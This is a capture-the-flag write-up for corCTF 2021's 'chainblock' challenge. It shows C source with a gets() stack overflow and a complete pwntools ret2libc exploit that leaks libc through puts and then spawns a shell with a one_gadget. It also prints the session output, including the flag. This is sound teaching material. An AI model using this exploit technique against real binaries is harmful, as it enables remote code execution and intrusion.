# Chainblock

> I made a chain of blocks!
>
> nc pwn.be.ax 5000



There are few files that we get, library, binary and source code of binary itself. 

~~~C
#include <stdio.h>

char* name = "Techlead";
int balance = 100000000;

void verify() {
	char buf[255];
	printf("Please enter your name: ");
	gets(buf);

	if (strcmp(buf, name) != 0) {
		printf("KYC failed, wrong identity!\n");
		return;
	}

	printf("Hi %s!\n", name);
	printf("Your balance is %d chainblocks!\n", balance);
}

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);

	printf("      ___           ___           ___                       ___     \n");
	printf("     /\\  \\         /\\__\\         /\\  \\          ___        /\\__\\    \n");
	printf("    /::\\  \\       /:/  /        /::\\  \\        /\\  \\      /::|  |   \n");
	printf("   /:/\\:\\  \\     /:/__/        /:/\\:\\  \\       \\:\\  \\    /:|:|  |   \n");
	printf("  /:/  \\:\\  \\   /::\\  \\ ___   /::\\~\\:\\  \\      /::\\__\\  /:/|:|  |__ \n");
	printf(" /:/__/ \\:\\__\\ /:/\\:\\  /\\__\\ /:/\\:\\ \\:\\__\\  __/:/\\/__/ /:/ |:| /\\__\\\n");
	printf(" \\:\\  \\  \\/__/ \\/__\\:\\/:/  / \\/__\\:\\/:/  / /\\/:/  /    \\/__|:|/:/  /\n");
	printf("  \\:\\  \\            \\::/  /       \\::/  /  \\::/__/         |:/:/  / \n");
	printf("   \\:\\  \\           /:/  /        /:/  /    \\:\\__\\         |::/  /  \n");
	printf("    \\:\\__\\         /:/  /        /:/  /      \\/__/         /:/  /   \n");
	printf("     \\/__/         \\/__/         \\/__/                     \\/__/    \n");
	printf("      ___           ___       ___           ___           ___     \n");
	printf("     /\\  \\         /\\__\\     /\\  \\         /\\  \\         /\\__\\    \n");
	printf("    /::\\  \\       /:/  /    /::\\  \\       /::\\  \\       /:/  /    \n");
	printf("   /:/\\:\\  \\     /:/  /    /:/\\:\\  \\     /:/\\:\\  \\     /:/__/     \n");
	printf("  /::\\~\\:\\__\\   /:/  /    /:/  \\:\\  \\   /:/  \\:\\  \\   /::\\__\\____ \n");
	printf(" /:/\\:\\ \\:|__| /:/__/    /:/__/ \\:\\__\\ /:/__/ \\:\\__\\ /:/\\:::::\\__\\\n");
	printf(" \\:\\~\\:\\/:/  / \\:\\  \\    \\:\\  \\ /:/  / \\:\\  \\  \\/__/ \\/_|:|~~|~   \n");
	printf("  \\:\\ \\::/  /   \\:\\  \\    \\:\\  /:/  /   \\:\\  \\          |:|  |    \n");
	printf("   \\:\\/:/  /     \\:\\  \\    \\:\\/:/  /     \\:\\  \\         |:|  |    \n");
	printf("    \\::/__/       \\:\\__\\    \\::/  /       \\:\\__\\        |:|  |    \n");
	printf("     ~~            \\/__/     \\/__/         \\/__/         \\|__|    \n");
	printf("\n\n");
	printf("----------------------------------------------------------------------------------");
	printf("\n\n");

	printf("Welcome to Chainblock, the world's most advanced chain of blocks.\n\n");

	printf("Chainblock is a unique company that combines cutting edge cloud\n");
	printf("technologies with high tech AI powered machine learning models\n");
	printf("to create a unique chain of blocks that learns by itself!\n\n");

	printf("Chainblock is also a highly secure platform that is unhackable by design.\n");
	printf("We use advanced technologies like NX bits and anti-hacking machine learning models\n");
	printf("to ensure that your money is safe and will always be safe!\n\n");

	printf("----------------------------------------------------------------------------------");
	printf("\n\n");

	printf("For security reasons we require that you verify your identity.\n");

	verify();
}
~~~



As you can see above, this is a classic buffer overflow vulnerability because of using malicious function **gets()**. 

Now lets checksec the binary

```
➜  chainblock git:(master) ✗ checksec chainblock 
[*] '/home/syahrul/Desktop/Writeups/corCTF_2021/pwn/chainblock/chainblock'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  './'
➜  chainblock git:(master) ✗ ldd chainblock
	linux-vdso.so.1 (0x00007ffce2ffe000)
	libc.so.6 => ./libc.so.6 (0x00007f765559d000)
	./ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f765578b000)
```

With minimal security mechanism in binary, we can do technique called ret2libc. The idea is, first we need to leak the base address and send one gadget payload into that binary.

**solver.py**

~~~python
from pwn import *

# f = process("./chainblock")
elf = ELF("./chainblock")
libc = ELF("./libc.so.6")
rop = ROP("./chainblock")

f = remote("pwn.be.ax",5000)

pop_rdi_ret = (rop.find_gadget(['pop rdi', 'ret']))[0]
main = elf.symbols['main']
puts = elf.plt['puts']
got = elf.got['puts']

payload = ""
payload += "A"*264
payload += p64(pop_rdi_ret)
payload += p64(got)
payload += p64(puts)
payload += p64(main)

if len(sys.argv) > 2:
	gdb.attach(f, "b *main+484\nc")

f.sendline(payload)
f.recvuntil("wrong identity!")
f.recvline()

leak = f.recvline().strip()
leak = leak.ljust(8, "\x00")
leak = u64(leak)

base_addr = leak - libc.symbols['puts']

one_gadget = base_addr + 0xde78f

log.info("puts() at : " + str(hex(leak)))
log.info("libc base @ %s" % hex(base_addr))



payload = ""
payload += "A"*264
payload += p64(one_gadget)
f.sendline(payload)

f.interactive()
~~~

```
➜  chainblock git:(master) ✗ python solver.py 
[*] '/home/syahrul/Desktop/Writeups/corCTF_2021/pwn/chainblock/chainblock'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  './'
[*] '/home/syahrul/Desktop/Writeups/corCTF_2021/pwn/chainblock/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 14 cached gadgets for './chainblock'
[+] Opening connection to pwn.be.ax on port 5000: Done
[*] puts() at : 0x7efe685919d0
[*] libc base @ 0x7efe68511000
[*] Switching to interactive mode
      ___           ___           ___                       ___     
     /\  \         /\__\         /\  \          ___        /\__\    
    /::\  \       /:/  /        /::\  \        /\  \      /::|  |   
   /:/\:\  \     /:/__/        /:/\:\  \       \:\  \    /:|:|  |   
  /:/  \:\  \   /::\  \ ___   /::\~\:\  \      /::\__\  /:/|:|  |__ 
 /:/__/ \:\__\ /:/\:\  /\__\ /:/\:\ \:\__\  __/:/\/__/ /:/ |:| /\__\
 \:\  \  \/__/ \/__\:\/:/  / \/__\:\/:/  / /\/:/  /    \/__|:|/:/  /
  \:\  \            \::/  /       \::/  /  \::/__/         |:/:/  / 
   \:\  \           /:/  /        /:/  /    \:\__\         |::/  /  
    \:\__\         /:/  /        /:/  /      \/__/         /:/  /   
     \/__/         \/__/         \/__/                     \/__/    
      ___           ___       ___           ___           ___     
     /\  \         /\__\     /\  \         /\  \         /\__\    
    /::\  \       /:/  /    /::\  \       /::\  \       /:/  /    
   /:/\:\  \     /:/  /    /:/\:\  \     /:/\:\  \     /:/__/     
  /::\~\:\__\   /:/  /    /:/  \:\  \   /:/  \:\  \   /::\__\____ 
 /:/\:\ \:|__| /:/__/    /:/__/ \:\__\ /:/__/ \:\__\ /:/\:::::\__\
 \:\~\:\/:/  / \:\  \    \:\  \ /:/  / \:\  \  \/__/ \/_|:|~~|~   
  \:\ \::/  /   \:\  \    \:\  /:/  /   \:\  \          |:|  |    
   \:\/:/  /     \:\  \    \:\/:/  /     \:\  \         |:|  |    
    \::/__/       \:\__\    \::/  /       \:\__\        |:|  |    
     ~~            \/__/     \/__/         \/__/         \|__|    


----------------------------------------------------------------------------------

Welcome to Chainblock, the world's most advanced chain of blocks.

Chainblock is a unique company that combines cutting edge cloud
technologies with high tech AI powered machine learning models
to create a unique chain of blocks that learns by itself!

Chainblock is also a highly secure platform that is unhackable by design.
We use advanced technologies like NX bits and anti-hacking machine learning models
to ensure that your money is safe and will always be safe!

----------------------------------------------------------------------------------

For security reasons we require that you verify your identity.
Please enter your name: KYC failed, wrong identity!
$ cat flag.txt
corctf{mi11i0nt0k3n_1s_n0t_a_scam_r1ght}$
```

**FLAG:** corctf{mi11i0nt0k3n_1s_n0t_a_scam_r1ght}